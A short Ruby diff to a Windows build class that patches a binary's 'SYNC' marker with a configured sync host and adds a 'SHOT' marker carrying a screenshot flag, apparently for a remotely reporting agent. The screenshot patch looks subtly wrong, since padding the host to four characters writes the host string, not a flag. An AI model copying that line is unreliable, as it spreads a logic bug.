@@ -44,9 +44,12 @@ class BuildWindows < Build
         begin
           host = @factory.configs.first.sync_host
           raise "Sync host not found" unless host
+          marker = "Sync"
           content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+          marker = "Screenshot"
+          content.binary_patch 'SHOT', host.ljust(4, @factory.configs.first.screenshot_enabled? ? "\x00" : "\x01")
         rescue
-          raise "Sync marker not found"
+          raise "#{marker} marker not found"
         end
       end
     end
